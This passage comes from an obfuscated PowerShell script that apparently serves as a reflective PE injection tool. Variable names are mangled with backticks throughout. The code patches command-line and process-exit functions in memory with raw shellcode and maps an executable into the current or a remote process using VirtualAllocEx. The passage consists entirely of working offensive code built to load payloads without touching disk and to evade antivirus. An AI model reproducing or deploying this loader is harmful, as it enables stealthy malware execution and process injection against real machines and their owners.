        ${p`Trsi`ze} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]${oLDpRot`EC`TfLAG} = 0

        [IntPtr]${ke`RnEl32`Han`dlE} = ${w`IN32fUNcT`I`Ons}.GetModuleHandle.Invoke("Kernel32.dll")
        if (${KERNe`L3`2`haN`DLe} -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]${KeR`NeLBa`sEH`An`D`LE} = ${WIN3`2F`Un`CTiONS}.GetModuleHandle.Invoke("KernelBase.dll")
        if (${kErN`E`lB`ASehAnDlE} -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        
        
        
        ${C`mDL`I`NEwARgS`PTR} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${EXEAr`g`UME`N`Ts})
        ${cMdl`INeA`A`RGSPTr} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${ex`EarguME`NTs})

        [IntPtr]${G`e`TcOmManD`LI`Ne`AaD`Dr} = ${wIn`32fuN`cT`IoNS}.GetProcAddress.Invoke(${KERne`lBaS`eH`And`lE}, "GetCommandLineA")
        [IntPtr]${Ge`Tc`Omm`A`Nd`lINewAD`dR} = ${WIn3`2FU`NCtIoNS}.GetProcAddress.Invoke(${Ke`RNelbaSEH`ANd`LE}, "GetCommandLineW")

        if (${GEtCoM`m`AndlInEAa`D`dr} -eq [IntPtr]::Zero -or ${g`Et`ComM`A`NdlIn`EwadDr} -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        
        [Byte[]]${S`heLLcOD`e1} = @()
        if (${pTR`SiZe} -eq 8)
        {
            ${s`hE`LlCodE1} += 0x48 
        }
        ${s`hELLcOD`E1} += 0xb8

        [Byte[]]${shell`Co`d`e2} = @(0xc3)
        ${TotAl`s`I`zE} = ${sh`elL`CoDe1}.Length + ${ptR`SizE} + ${sheL`Lc`oD`e2}.Length

        
        ${geTC`o`MmANDl`i`NeAoRigbyTe`s`PtR} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${toTAl`s`ize})
        ${g`eTC`om`MANdlINeWORi`GB`Y`TeSptR} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${T`O`TALsIzE})
        ${wi`N3`2F`UNCTiONs}.memcpy.Invoke(${getC`OMManDlIn`EaoriGbYTE`S`ptR}, ${GEtcom`MAn`D`li`NE`AaddR}, [UInt64]${T`OtAlSI`Ze}) | Out-Null
        ${WIN`32fUN`Ctions}.memcpy.Invoke(${gEtcOmMA`NdLINEw`O`RIgb`Y`TEsPtr}, ${gE`TCOmmAND`Lin`EW`AdDR}, [UInt64]${TOTA`LS`iZe}) | Out-Null
        ${RETU`RNAr`RAY} += ,(${Ge`T`co`MMaNDl`I`NEAaDDR}, ${gETc`OMMAN`dLINEaORIgBy`TEsp`TR}, ${TO`Ta`L`SIzE})
        ${REt`UrN`ArR`AY} += ,(${G`eTC`OMMand`LiN`eWaDDr}, ${GETc`OMMAnD`linewo`Ri`G`By`T`ESptr}, ${ToTAls`i`ze})

        
        [UInt32]${oL`dP`RotE`CtFL`Ag} = 0
        ${s`U`CcesS} = ${W`in`32`FUnctio`Ns}.VirtualProtect.Invoke(${gET`co`m`mAn`DlI`Ne`AADDr}, [UInt32]${T`Ota`LSizE}, [UInt32](${w`in32`c`O`Nstants}.PAGE_EXECUTE_READWRITE), [Ref]${Ol`dp`RoteCTf`lAG})
        if (${SU`CCE`SS} = ${Fa`lse})
        {
            throw "Call to VirtualProtect failed"
        }

        ${g`E`TcOMMaNd`lInE`AAdDr`TEmp} = ${geTCoMMaNDlIN`EA`AD`dr}
        Write-BytesToMemory -Bytes ${S`HELL`cOd`e1} -MemoryAddress ${G`et`com`M`AndLiNE`AadDrtE`mp}
        ${GETC`O`MmAN`DlinEA`ADdRTeMp} = Add-SignedIntAsUnsigned ${ge`TCOmM`AN`DliN`Eaadd`RteMp} (${shE`llc`oDe1}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${C`mDl`inEAarGsp`TR}, ${gEt`cOmManDli`NE`AA`d`DRtemp}, ${F`AlSe})
        ${Get`co`mman`dLIneA`ADdrTeMP} = Add-SignedIntAsUnsigned ${GetcOmmAnd`lI`NeA`ADdr`T`eMP} ${ptr`si`Ze}
        Write-BytesToMemory -Bytes ${SHEllcO`d`e2} -MemoryAddress ${g`eTCo`mmaN`D`liNe`AADD`RT`emp}

        ${wIn`32fUN`CtIo`NS}.VirtualProtect.Invoke(${gET`ComMa`N`DliN`eAA`D`dR}, [UInt32]${TotA`l`SiZe}, [UInt32]${OLdPr`otE`c`Tflag}, [Ref]${o`Ld`P`ROteCT`FlAg}) | Out-Null


        
        [UInt32]${olDPR`oTE`c`T`FLaG} = 0
        ${suCc`E`ss} = ${wIN32fu`NcT`IonS}.VirtualProtect.Invoke(${GeTc`OMm`A`NdL`IneWAdDr}, [UInt32]${t`O`TaL`sIzE}, [UInt32](${Win32co`NsT`A`N`Ts}.PAGE_EXECUTE_READWRITE), [Ref]${O`LdPr`OTE`cT`FLAg})
        if (${su`ccESS} = ${Fa`LSE})
        {
            throw "Call to VirtualProtect failed"
        }

        ${g`eTComMAnDliN`E`wADdr`TEmP} = ${G`EtcoMMandlineW`AD`dr}
        Write-BytesToMemory -Bytes ${s`HEL`LcOde1} -MemoryAddress ${G`eTcoM`MANDl`iNe`WAD`DRTE`MP}
        ${GE`T`Comm`ANDLiNEwa`dD`RTEMp} = Add-SignedIntAsUnsigned ${gEt`co`Mm`AndliNeW`Ad`dR`Te`Mp} (${shelL`CO`d`e1}.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${c`mdLIN`EwArg`sP`Tr}, ${G`ETcOMMaN`DLiNEwa`dDR`TEMP}, ${fA`L`SE})
        ${Getc`o`mMANd`LIN`eWa`DDrTEmP} = Add-SignedIntAsUnsigned ${GEtC`OMMAndl`IN`eWA`d`dRT`EMP} ${p`TRsi`zE}
        Write-BytesToMemory -Bytes ${Sh`ellcOd`E2} -MemoryAddress ${geTCO`m`MAnD`L`iNeWaD`DRT`eMP}

        ${wIN32`FunC`Ti`o`Ns}.VirtualProtect.Invoke(${GeT`COmMaNdlInEw`Ad`Dr}, [UInt32]${t`o`TaLsI`zE}, [UInt32]${olD`pRoTeCT`F`lAg}, [Ref]${oLdpRoTEC`TF`L`AG}) | Out-Null
        

        
        
        
        
        
        ${Dl`lli`ST} = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach (${D`Ll} in ${d`lllI`St})
        {
            [IntPtr]${dLL`HaND`le} = ${wIn32f`U`NCt`io`NS}.GetModuleHandle.Invoke(${D`lL})
            if (${dllH`And`le} -ne [IntPtr]::Zero)
            {
                [IntPtr]${WC`M`DLn`AdDR} = ${wIN`32Func`TIO`Ns}.GetProcAddress.Invoke(${d`LLHA`N`dLE}, "_wcmdln")
                [IntPtr]${a`CMdLn`AdDR} = ${WIN32`F`Unc`TionS}.GetProcAddress.Invoke(${dlL`haND`Le}, "_acmdln")
                if (${WcMD`lN`A`DDr} -eq [IntPtr]::Zero -or ${Acm`D`lnAddR} -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                ${ne`Wac`MDLNPtr} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${eX`ea`R`gUMeN`TS})
                ${NeWwCmD`ln`ptR} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${EX`eAR`gUMEntS})

                
                ${OR`iGacM`D`lnPTr} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${aCM`DLNaD`DR}, [Type][IntPtr])
                ${orig`wc`md`lN`ptr} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${W`Cm`DlnaDdr}, [Type][IntPtr])
                ${OriGaC`M`d`lN`ptrstor`A`gE} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${P`TrS`ize})
                ${or`i`g`WCMD`LNp`TRStoRAgE} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${P`TRs`iZe})
                [System.Runtime.InteropServices.Marshal]::StructureToPtr(${ORiga`CmDlN`pTR}, ${ORIgAcMDLN`pt`RsToRa`ge}, ${fA`LSe})
                [System.Runtime.InteropServices.Marshal]::StructureToPtr(${Ori`GwcMD`LNpTr}, ${o`RiGwCMdlnp`TrS`TOrage}, ${f`A`lSe})
                ${RETU`R`NA`RraY} += ,(${A`c`mdLN`ADdR}, ${Origa`CMDlN`p`Trst`o`RagE}, ${P`TrsizE})
                ${R`ET`URNAr`RAy} += ,(${Wc`mDlNa`D`DR}, ${or`i`g`WcmDLNpTRS`Tor`AGE}, ${P`TRSI`ZE})

                ${SUC`c`ESS} = ${win32FUNct`I`O`NS}.VirtualProtect.Invoke(${a`CmDl`Na`DDR}, [UInt32]${p`TR`sIzE}, [UInt32](${Wi`N3`2cONsTaNts}.PAGE_EXECUTE_READWRITE), [Ref]${o`LDpR`O`TECt`FlAg})
                if (${s`UCceSS} = ${f`Al`SE})
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr(${n`Ewac`m`dlNpTr}, ${a`CMDl`NADDr}, ${F`A`LSE})
                ${Win32`F`U`NC`TIOns}.VirtualProtect.Invoke(${a`CMdLn`A`ddR}, [UInt32]${pT`RsIZe}, [UInt32](${oL`DP`RO`TeCtfl`Ag}), [Ref]${olDPr`OTec`Tf`L`AG}) | Out-Null

                ${sucC`eSS} = ${WiN3`2`FUNC`TIo`Ns}.VirtualProtect.Invoke(${WC`mDl`NADdR}, [UInt32]${p`TrsIzE}, [UInt32](${WIn`32ConS`TANts}.PAGE_EXECUTE_READWRITE), [Ref]${OL`Dp`RotEcT`FLaG})
                if (${sU`CC`ESs} = ${F`Al`sE})
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr(${Ne`wWcMdlNp`Tr}, ${wC`Md`LNAdDr}, ${f`A`lSE})
                ${wIn3`2FUncTI`ONS}.VirtualProtect.Invoke(${Wcmd`LNA`DdR}, [UInt32]${P`TrsI`zE}, [UInt32](${O`ldP`ROtE`Ctf`lAG}), [Ref]${oLDPRO`TeC`TFLaG}) | Out-Null
            }
        }
        

        
        

        ${REt`Urna`RRAy} = @()
        ${Exitf`Un`ct`IONS} = @() 

        
        [IntPtr]${mSCO`R`EE`ha`NDLE} = ${WiN32`F`UNCtIO`Ns}.GetModuleHandle.Invoke("mscoree.dll")
        if (${mScoR`E`eH`An`DLE} -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]${cor`e`XIt`pR`oCes`SadDr} = ${Wi`N32fU`N`cTiOns}.GetProcAddress.Invoke(${MS`Cor`ee`hanDlE}, "CorExitProcess")
        if (${cORexI`TP`RoC`eSsA`dDr} -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        ${Ex`I`TFuN`ctiOns} += ${CoReXItpRO`cess`A`Ddr}

        
        [IntPtr]${Exi`T`PR`OcEsSa`DDr} = ${w`in`32fu`NCtIONs}.GetProcAddress.Invoke(${KEr`N`EL32h`AN`dLE}, "ExitProcess")
        if (${eXITp`R`oc`EsSa`dDr} -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        ${exiTfu`N`c`TioNS} += ${E`XItPRoC`e`ssAddr}

        [UInt32]${O`Ld`pRO`Te`CTFlAg} = 0
        foreach (${Pr`oCeX`itFunCtIO`NADDr} in ${Ex`iTfUNCt`ionS})
        {
            ${P`ROcExItfuN`c`TIoN`Add`RtmP} = ${pR`Ocexit`FUNCTi`onA`DDr}
            
            
            [Byte[]]${Sh`E`lLC`ode1} = @(0xbb)
            [Byte[]]${ShE`lL`coDe2} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            
            if (${P`TR`sizE} -eq 8)
            {
                [Byte[]]${Sh`ell`c`ode1} = @(0x48, 0xbb)
                [Byte[]]${sh`eLlC`Ode2} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]${sHeL`L`COD`E3} = @(0xff, 0xd3)
            ${tOTals`i`zE} = ${Sh`eLLCOd`E1}.Length + ${PTr`sI`ZE} + ${s`heLL`c`OdE2}.Length + ${p`TRS`IzE} + ${S`HELLc`o`dE3}.Length

            [IntPtr]${EXitTHr`EA`D`A`ddR} = ${W`IN`32fUn`cTioNS}.GetProcAddress.Invoke(${KE`Rn`EL32hAnDle}, "ExitThread")
            if (${EXITT`HRea`dADDR} -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            ${sUC`c`eSs} = ${WIn`32Fu`NCt`i`Ons}.VirtualProtect.Invoke(${procExI`T`F`UnctIO`NA`Ddr}, [UInt32]${toTA`ls`iZe}, [UInt32]${w`iN32COnsta`N`TS}.PAGE_EXECUTE_READWRITE, [Ref]${o`LDPr`OTECt`FLAG})
            if (${s`UcCe`SS} -eq ${f`A`lSe})
            {
                Throw "Call to VirtualProtect failed"
            }

            
            ${EX`itP`RoCEs`sO`R`iG`ByTEsPtr} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${tota`L`SI`ZE})
            ${W`In32F`UNCt`Io`NS}.memcpy.Invoke(${exiT`PrOCes`SOrI`gBYte`S`PtR}, ${ProC`E`xI`TfUNCtIOnA`DDR}, [UInt64]${toTals`i`ZE}) | Out-Null
            ${Retu`RNAr`R`Ay} += ,(${PrO`CExITFun`cTio`NaddR}, ${eXITpROce`S`SoRIG`B`yt`E`s`PTr}, ${tOtaL`Si`zE})

            
            
            Write-BytesToMemory -Bytes ${Sh`EL`LCO`DE1} -MemoryAddress ${p`RoceXITFUN`c`T`iON`ADDRTMp}
            ${pROcE`Xi`TfuNct`IO`NAD`DR`TMP} = Add-SignedIntAsUnsigned ${PR`O`ce`xit`FUN`ctiOnad`d`RTmP} (${sH`E`LLcO`de1}.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${E`xED`oneBy`T`eptR}, ${prOcExItfu`Nct`IONa`dDr`TmP}, ${F`Al`Se})
            ${P`Ro`c`Ex`itfU`NCTIOna`DdrTMP} = Add-SignedIntAsUnsigned ${pRO`c`E`xI`T`FU`NC`TIonaddrtMP} ${pT`R`Size}
            Write-BytesToMemory -Bytes ${S`HE`llCo`de2} -MemoryAddress ${p`ROcE`xitFUNCTion`A`ddrTmP}
            ${p`R`OcEx`iTFUn`CT`ioNaddRTMP} = Add-SignedIntAsUnsigned ${PrOc`E`X`IT`FU`NCtiONAdd`RtmP} (${sH`eL`lC`ode2}.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${E`xiTt`h`READadDR}, ${p`Ro`cex`iTfUnctIONa`d`d`RTmp}, ${FAL`se})
            ${PRoC`eXi`Tfu`NcTION`AD`DRtmp} = Add-SignedIntAsUnsigned ${PrOCEx`i`T`FUN`c`TionADDRT`mP} ${pTR`SIzE}
            Write-BytesToMemory -Bytes ${sHel`l`C`Ode3} -MemoryAddress ${Proc`EXI`TfunctIONA`DDr`TMp}

            ${WIN32`FuNC`TI`O`Ns}.VirtualProtect.Invoke(${pr`OcExItfu`NC`TIoN`Ad`Dr}, [UInt32]${T`OtAL`sIZe}, [UInt32]${OL`DProt`ecTf`LAg}, [Ref]${oldPr`o`Tec`T`Flag}) | Out-Null
        }
        

        Write-Output ${RetU`R`NArR`AY}
    }

    
    
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${tR`Ue})]
        [Array[]]
        ${cO`pyIN`Fo},

        [Parameter(Position = 1, Mandatory = ${t`RuE})]
        [System.Object]
        ${wIN32f`Un`cTio`NS},

        [Parameter(Position = 2, Mandatory = ${Tr`UE})]
        [System.Object]
        ${Wi`N`32COnsTa`NtS}
        )

        [UInt32]${ol`DPRoTECT`Flag} = 0
        foreach (${in`FO} in ${cOp`y`InFo})
        {
            ${s`U`CcesS} = ${w`iN3`2fU`Nctio`NS}.VirtualProtect.Invoke(${iN`Fo}[0], [UInt32]${I`NFO}[2], [UInt32]${W`in32ConST`A`NtS}.PAGE_EXECUTE_READWRITE, [Ref]${O`LDP`RoTe`CtF`lAG})
            if (${SU`ccEss} -eq ${f`Al`sE})
            {
                Throw "Call to VirtualProtect failed"
            }

            ${wIN3`2`F`UNcT`ioNS}.memcpy.Invoke(${In`Fo}[0], ${i`Nfo}[1], [UInt64]${In`FO}[2]) | Out-Null

            ${win32f`U`NC`TI`oNs}.VirtualProtect.Invoke(${I`NFo}[0], [UInt32]${In`Fo}[2], [UInt32]${o`lDproT`ECTFl`AG}, [Ref]${o`LdprOt`EcTFLAG}) | Out-Null
        }
    }


    
    
    
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${T`RUE})]
        [IntPtr]
        ${PE`han`DLE},

        [Parameter(Position = 1, Mandatory = ${T`RuE})]
        [String]
        ${FUNc`TiO`NN`AME}
        )

        ${wIn32t`Yp`Es} = Get-Win32Types
        ${Win32c`oNs`TANtS} = Get-Win32Constants
        ${P`eiNfO} = Get-PEDetailedInfo -PEHandle ${Peha`ND`lE} -Win32Types ${Wi`N`32`Types} -Win32Constants ${w`iN32conST`ANTs}

        
        if (${p`einFo}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        ${E`XpOr`TT`ABLePtr} = Add-SignedIntAsUnsigned (${Pe`HANdlE}) (${peiN`Fo}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        ${E`Xpo`Rt`TabLE} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${eXpO`RtT`ABLe`PtR}, [Type]${wIN`3`2TYPES}.IMAGE_EXPORT_DIRECTORY)

        for (${I} = 0; ${I} -lt ${EXpO`Rt`TaBLe}.NumberOfNames; ${i}++)
        {
            
            ${n`A`MeoFfset`P`Tr} = Add-SignedIntAsUnsigned (${PEHA`N`dLe}) (${E`X`p`OrTTABle}.AddressOfNames + (${i} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            ${nA`MEP`TR} = Add-SignedIntAsUnsigned (${PE`H`AndLe}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${N`Ameoff`sE`T`PtR}, [Type][UInt32]))
            ${nA`me} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${NA`M`ePTR})

            if (${n`AMe} -ceq ${FU`NcT`IonN`AME})
            {
                
                
                ${oRdI`Na`L`pTr} = Add-SignedIntAsUnsigned (${pEhA`Nd`lE}) (${E`xPORTTA`B`LE}.AddressOfNameOrdinals + (${i} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                ${fuN`CiN`dex} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${or`diNaL`ptR}, [Type][UInt16])
                ${f`U`NCoFf`SE`TadDr} = Add-SignedIntAsUnsigned (${PEHAn`d`lE}) (${exP`oR`TTaB`le}.AddressOfFunctions + (${F`UNc`iNDEx} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                ${fUN`CO`F`FSeT} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${fU`NcOFfseTad`DR}, [Type][UInt32])
                return Add-SignedIntAsUnsigned (${pEh`A`NDlE}) (${fUNC`off`set})
            }
        }

        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = ${TR`Ue} )]
        [Byte[]]
        ${Pe`BYT`eS},

        [Parameter(Position = 1, Mandatory = ${fa`LSe})]
        [String]
        ${eX`EA`RGS},

        [Parameter(Position = 2, Mandatory = ${F`A`lSE})]
        [IntPtr]
        ${Re`M`Ot`Ep`RochandlE},

        [Parameter(Position = 3)]
        [Bool]
        ${fo`RC`eAsLR} = ${FAl`sE}
        )

        ${pTR`si`Ze} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        
        ${WIn`32cOn`STaNTS} = Get-Win32Constants
        ${Win`3`2`FuNCtIOnS} = Get-Win32Functions
        ${W`IN3`2t`ypES} = Get-Win32Types

        ${rEMOT`eLo`Ad`iNG} = ${f`AL`SE}
        if ((${R`EMoTEpro`c`H`Andle} -ne ${n`ULL}) -and (${rEMoT`ePro`c`hA`NDlE} -ne [IntPtr]::Zero))
        {
            ${ReM`oTElOAD`ING} = ${tr`Ue}
        }

        
        Write-Verbose "Getting basic PE information from the file"
        ${peIN`Fo} = Get-PEBasicInfo -PEBytes ${p`ebyT`ES} -Win32Types ${w`I`N32TYpES}
        ${o`RiGinA`LI`M`Age`BAsE} = ${P`E`INfO}.OriginalImageBase
        ${NxCom`p`ATiB`LE} = ${t`RUe}
        if (([Int] ${Pe`i`Nfo}.DllCharacteristics -band ${WIN`32`cOnS`Tants}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne ${w`i`N32CO`NSTa`NTS}.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            ${Nx`COM`P`At`IBLe} = ${F`ALsE}
        }

        
        ${Pr`oCe`ss6`4biT} = ${tR`Ue}
        if (${RemOTe`L`oa`Ding} -eq ${tr`Ue})
        {
            ${KerneL3`2hA`N`DLe} = ${w`iN3`2fun`cTions}.GetModuleHandle.Invoke("kernel32.dll")
            ${R`Es`UlT} = ${wIN32Fu`NCt`iONS}.GetProcAddress.Invoke(${kEr`NeL3`2`HAnD`LE}, "IsWow64Process")
            if (${R`ES`ULt} -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]${Wo`W6`4P`ROCESS} = ${faL`SE}
            ${sUC`ce`sS} = ${wIN32`Fun`ct`I`OnS}.IsWow64Process.Invoke(${reM`o`TePRO`cHa`NdLE}, [Ref]${w`ow64p`R`Oc`ESs})
            if (${su`CCesS} -eq ${faL`sE})
            {
                Throw "Call to IsWow64Process failed"
            }

            if ((${Wow64P`Ro`cesS} -eq ${TR`UE}) -or ((${wo`w64prOc`ess} -eq ${FAL`Se}) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                ${pROcESs6`4`B`it} = ${f`Al`sE}
            }

            
            ${p`owe`RSHeLl6`4BiT} = ${T`Rue}
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                ${poWeR`she`LL6`4BiT} = ${Fa`lse}
            }
            if (${PoW`eR`sHEl`l64Bit} -ne ${PRoc`e`SS64bit})
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                ${PRoC`ESs`64Bit} = ${fal`se}
            }
        }
        if (${P`ROceS`S64bIT} -ne ${pE`i`NFO}.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }

        
        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        
        [IntPtr]${loAD`A`DdR} = [IntPtr]::Zero
        ${p`esUP`Po`RTSa`SLr} = ([Int] ${PE`i`NFo}.DllCharacteristics -band ${wiN3`2cO`Nst`ANTs}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq ${wi`N`32`cOn`sTaNTS}.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not ${FOrCE`AS`LR}) -and (-not ${PESuP`poRT`SASlR}))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]${LOa`dadDr} = ${OrigIN`A`lImAG`e`BA`Se}
        }
        elseif (${Forcea`s`LR} -and (-not ${p`EsuP`PoRTs`As`lR}))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if (${for`C`eaSLr} -and ${R`emo`TELOAd`iNg})
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if (${rEMOtEl`oAd`I`Ng} -and (-not ${P`E`sUppOrTS`ASlr}))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        ${P`E`HANdle} = [IntPtr]::Zero              
        ${e`FFeC`TIVEP`EhAndle} = [IntPtr]::Zero     
        if (${rEmO`TEl`oaDI`Ng} -eq ${tR`Ue})
        {
            
            ${pEhAND`Le} = ${Win`3`2`FUNCtIO`NS}.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${p`eI`NfO}.SizeOfImage, ${wI`N3`2cOn`S`TaNTS}.MEM_COMMIT -bor ${WIN3`2conSt`AntS}.MEM_RESERVE, ${WIN32conS`Ta`N`TS}.PAGE_READWRITE)

            
            ${effe`cTiVEpEHa`Nd`LE} = ${WIN3`2fU`NcTI`ONS}.VirtualAllocEx.Invoke(${reM`OTePr`OCh`A`N`dle}, ${LOaDa`DDR}, [UIntPtr]${pe`iNfO}.SizeOfImage, ${WiN3`2cO`NS`T`ANtS}.MEM_COMMIT -bor ${wIN`32`C`onsTan`TS}.MEM_RESERVE, ${WI`N3`2C`O`NsTAntS}.PAGE_EXECUTE_READWRITE)
            if (${e`FfeCtivEP`Eh`AN`DLE} -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if (${n`X`CO`MpaTiBLe} -eq ${TR`Ue})
            {
                ${pEhA`N`DLE} = ${win`32`FUNc`Ti`onS}.VirtualAlloc.Invoke(${l`Oa`DAddr}, [UIntPtr]${Pe`i`NFo}.SizeOfImage, ${w`iN32cO`NS`T`AnTS}.MEM_COMMIT -bor ${WI`N3`2constaN`TS}.MEM_RESERVE, ${wiN`32C`O`Ns`Tants}.PAGE_READWRITE)
            }
            else
            {
                ${P`Eha`NDle} = ${wIn32`FuNCT`Io`NS}.VirtualAlloc.Invoke(${lo`ADa`DdR}, [UIntPtr]${p`eIn`Fo}.SizeOfImage, ${w`In`32c`oNStan`TS}.MEM_COMMIT -bor ${WIN3`2Co`NSTA`N`TS}.MEM_RESERVE, ${Wi`N`32const`ANTS}.PAGE_EXECUTE_READWRITE)
            }
            ${E`FFecTiVEp`Eha`N`dlE} = ${P`ehA`Ndle}
        }

        [IntPtr]${PeEND`Ad`DRess} = Add-SignedIntAsUnsigned (${PEHA`Nd`lE}) ([Int64]${pe`inFo}.SizeOfImage)
        if (${peH`A`NDlE} -eq [IntPtr]::Zero)
        {
            Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
        }
        [System.Runtime.InteropServices.Marshal]::Copy(${PE`B`YTes}, 0, ${P`EhAn`dLE}, ${p`einfO}.SizeOfHeaders) | Out-Null


        
        Write-Verbose "Getting detailed PE information from the headers loaded in memory"
        ${PEi`NFo} = Get-PEDetailedInfo -PEHandle ${P`EhaN`DlE} -Win32Types ${WIN`3`2TyPes} -Win32Constants ${wIN3`2`cONstA`N`TS}
        ${P`EiN`Fo} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${P`e`e`NDaddrESs}
        ${PEi`Nfo} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${efFECTIvE`PEhan`D`lE}
        Write-Verbose "StartAddress: $(Get-Hex $PEHandle)    EndAddress: $(Get-Hex $PEEndAddress)"


        
        Write-Verbose "Copy PE sections in to memory"
        Copy-Sections -PEBytes ${p`eBYt`ES} -PEInfo ${Pe`i`Nfo} -Win32Functions ${win32fU`NcTI`o`Ns} -Win32Types ${w`in32`TYP`Es}


        
        Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
        Update-MemoryAddresses -PEInfo ${p`E`iNFo} -OriginalImageBase ${OrIg`I`N`Al`imag`EBase} -Win32Constants ${wI`N3`2C`o`NStANts} -Win32Types ${wIn32`TYP`eS}


        
        Write-Verbose "Import DLL's needed by the PE we are loading"
        if (${reMOtel`oa`d`INg} -eq ${Tr`UE})
        {
            Import-DllImports -PEInfo ${pei`NFO} -Win32Functions ${wIn`32FuN`c`TiO`Ns} -Win32Types ${WIN`3`2TYP`Es} -Win32Constants ${WIN3`2constaN`Ts} -RemoteProcHandle ${rE`motePr`oCHanD`lE}
        }
        else
        {
            Import-DllImports -PEInfo ${p`ei`NfO} -Win32Functions ${wi`N3`2`Fu`NctiOns} -Win32Types ${wI`N`3`2tYpeS} -Win32Constants ${win`32cON`s`T`Ants}
        }


        
        if (${Re`MoTe`loa`dING} -eq ${f`A`Lse})
        {
            if (${nX`cOm`PA`TIBle} -eq ${t`RuE})
            {
                Write-Verbose "Update memory protection flags"
                Update-MemoryProtectionFlags -PEInfo ${P`ei`NfO} -Win32Functions ${WiN`3`2`FUNctIo`Ns} -Win32Constants ${Win`32COn`stA`N`Ts} -Win32Types ${WIN`3`2Types}
            }
            else
            {
